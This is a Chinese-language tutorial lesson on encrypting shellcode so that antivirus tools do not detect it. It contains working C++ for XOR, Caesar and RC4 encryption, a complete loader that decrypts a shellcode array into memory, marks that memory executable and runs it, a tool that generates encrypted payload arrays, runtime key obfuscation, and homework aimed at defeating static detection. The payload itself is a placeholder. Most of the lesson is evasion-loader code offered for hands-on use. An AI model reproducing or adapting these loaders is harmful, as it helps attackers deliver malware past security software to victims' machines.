# 课时22：ShellCode加密原理

## 1. 课程目标

学习ShellCode加密的原理和基本实现方法，理解加密在免杀中的作用。

### 1.1 学习目标

- 理解ShellCode为什么需要加密
- 掌握常见的加密算法原理
- 学会实现加密和解密流程
- 了解密钥管理策略

---

## 2. 名词解释

| 名词 | 英文 | 解释 |
|------|------|------|
| **明文** | Plaintext | 未加密的原始ShellCode |
| **密文** | Ciphertext | 加密后的ShellCode |
| **密钥** | Key | 用于加密解密的秘密数据 |
| **对称加密** | Symmetric Encryption | 加密解密使用相同密钥 |
| **非对称加密** | Asymmetric Encryption | 使用公钥私钥对 |
| **异或加密** | XOR Encryption | 最简单的位运算加密 |
| **流密码** | Stream Cipher | 逐字节加密的方式 |

---

## 3. 加密原理

### 3.1 为什么要加密ShellCode

```
未加密的ShellCode:
┌───────────────────────────────────────────┐
│ \x68\x00\x00\x40\x00\x68\x00\x00\x40\x00   │ → 静态特征明显
│ 杀毒软件可以直接匹配特征码               │ → 被检测
└───────────────────────────────────────────┘

加密后的ShellCode:
┌───────────────────────────────────────────┐
│ \x9A\x32\x48\x7F\x31\x9B\x33\x49\x80\x32   │ → 看起来像随机数据
│ 每次加密结果不同（不同密钥）              │ → 难以匹配
└───────────────────────────────────────────┘
```

### 3.2 加密执行流程

```
编译时/部署前:
┌───────────┐    ┌───────────┐    ┌───────────┐
│  明文SC   │ →  │  加密算法  │ →  │  密文SC   │
└───────────┘    └───────────┘    └───────────┘
                       ↑
                   密钥(Key)

运行时:
┌───────────┐    ┌───────────┐    ┌───────────┐    ┌───────────┐
│  密文SC   │ →  │  解密算法  │ →  │  明文SC   │ →  │   执行    │
└───────────┘    └───────────┘    └───────────┘    └───────────┘
                       ↑
                   密钥(Key)
```

---

## 4. 常见加密方法

### 4.1 加密算法对比

| 算法 | 复杂度 | 安全性 | 适用场景 |
|------|--------|--------|----------|
| XOR | 极低 | 低 | 简单混淆 |
| Caesar | 低 | 低 | 简单混淆 |
| RC4 | 中 | 中 | 一般用途 |
| AES | 高 | 高 | 高安全需求 |
| ChaCha20 | 中 | 高 | 高性能需求 |

### 4.2 XOR加密

```cpp
// 最简单的XOR加密
void XOREncrypt(LPBYTE pData, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= key;
    }
}

// 多字节密钥XOR
void XOREncryptMultiKey(LPBYTE pData, SIZE_T size, LPBYTE pKey, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= pKey[i % keyLen];
    }
}
```

### 4.3 凯撒加密

```cpp
// 凯撒加密（字节偏移）
void CaesarEncrypt(LPBYTE pData, SIZE_T size, int shift) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (pData[i] + shift) & 0xFF;
    }
}

void CaesarDecrypt(LPBYTE pData, SIZE_T size, int shift) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] = (pData[i] - shift) & 0xFF;
    }
}
```

### 4.4 RC4加密

```cpp
// RC4流密码
typedef struct _RC4_CTX {
    BYTE S[256];
    int i, j;
} RC4_CTX;

void RC4Init(RC4_CTX* ctx, LPBYTE key, int keyLen) {
    for (int i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }
    
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keyLen]) & 0xFF;
        BYTE temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
    
    ctx->i = 0;
    ctx->j = 0;
}

void RC4Crypt(RC4_CTX* ctx, LPBYTE data, int len) {
    for (int n = 0; n < len; n++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        
        BYTE temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;
        
        BYTE k = ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
        data[n] ^= k;
    }
}
```

---

## 5. 完整加密Loader

```cpp
#include <windows.h>
#include <stdio.h>

// 加密后的ShellCode
unsigned char encryptedShellcode[] = {
    // 使用工具加密后的数据
    0x00, 0x00, 0x00, 0x00  // 占位符
};

// 密钥
unsigned char key[] = { 0x41, 0x42, 0x43, 0x44 };

// XOR解密并执行
void DecryptAndExecute() {
    SIZE_T size = sizeof(encryptedShellcode);
    SIZE_T keyLen = sizeof(key);
    
    // 1. 分配可执行内存
    LPVOID pMem = VirtualAlloc(NULL, size, 
                               MEM_COMMIT | MEM_RESERVE, 
                               PAGE_READWRITE);
    if (!pMem) return;
    
    // 2. 复制加密数据
    memcpy(pMem, encryptedShellcode, size);
    
    // 3. 解密
    LPBYTE pData = (LPBYTE)pMem;
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= key[i % keyLen];
    }
    
    // 4. 修改权限为可执行
    DWORD oldProtect;
    VirtualProtect(pMem, size, PAGE_EXECUTE_READ, &oldProtect);
    
    // 5. 执行
    ((void(*)())pMem)();
    
    // 6. 清理
    VirtualFree(pMem, 0, MEM_RELEASE);
}

int main() {
    DecryptAndExecute();
    return 0;
}
```

---

## 6. 加密工具实现

```cpp
#include <windows.h>
#include <stdio.h>

// ShellCode加密工具
void EncryptShellcode(LPBYTE pShellcode, SIZE_T size, LPBYTE pKey, SIZE_T keyLen) {
    printf("// 加密后的ShellCode\n");
    printf("unsigned char encryptedShellcode[] = {\n    ");
    
    for (SIZE_T i = 0; i < size; i++) {
        BYTE encrypted = pShellcode[i] ^ pKey[i % keyLen];
        printf("0x%02X", encrypted);
        
        if (i < size - 1) {
            printf(", ");
        }
        
        if ((i + 1) % 12 == 0) {
            printf("\n    ");
        }
    }
    
    printf("\n};\n\n");
    
    printf("// 密钥\n");
    printf("unsigned char key[] = { ");
    for (SIZE_T i = 0; i < keyLen; i++) {
        printf("0x%02X", pKey[i]);
        if (i < keyLen - 1) printf(", ");
    }
    printf(" };\n");
}

int main() {
    // 原始ShellCode（示例）
    unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8  // ... 完整ShellCode
    };
    
    // 密钥
    unsigned char key[] = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 };
    
    EncryptShellcode(shellcode, sizeof(shellcode), key, sizeof(key));
    
    return 0;
}
```

---

## 7. 密钥管理

### 7.1 密钥存储策略

| 策略 | 优点 | 缺点 |
|------|------|------|
| 硬编码 | 简单 | 容易提取 |
| 环境变量 | 灵活 | 需要配置 |
| 远程获取 | 安全 | 需要网络 |
| 运行时生成 | 安全 | 复杂 |
| 分散存储 | 较安全 | 实现复杂 |

### 7.2 密钥混淆示例

```cpp
// 不直接存储密钥，而是运行时计算
BYTE GetKey(int index) {
    // 通过计算获取密钥字节
    BYTE base[] = { 0x10, 0x20, 0x30, 0x40 };
    return base[index % 4] ^ 0x51 + index;
}

void DecryptWithDynamicKey(LPBYTE pData, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        pData[i] ^= GetKey(i);
    }
}
```

---

## 8. 注意事项

1. **解密代码也可能被检测**: 杀软可能识别解密循环
2. **内存扫描**: 解密后在内存中仍可被检测
3. **行为检测**: VirtualAlloc+VirtualProtect组合可疑
4. **加密不等于安全**: 加密只是增加分析难度

---

## 9. 课后作业

### 作业1：XOR加密（必做）

1. 实现XOR加密工具
2. 加密一段ShellCode并验证能正确解密执行

### 作业2：RC4加密（进阶）

1. 实现RC4加密Loader
2. 与XOR对比检测效果

### 作业3：密钥保护（高级）

1. 设计一个密钥混淆方案
2. 使密钥难以被静态提取

---

## 10. 下一课预告

下一课我们将学习异或和凯撒加密ShellCode的具体实现。
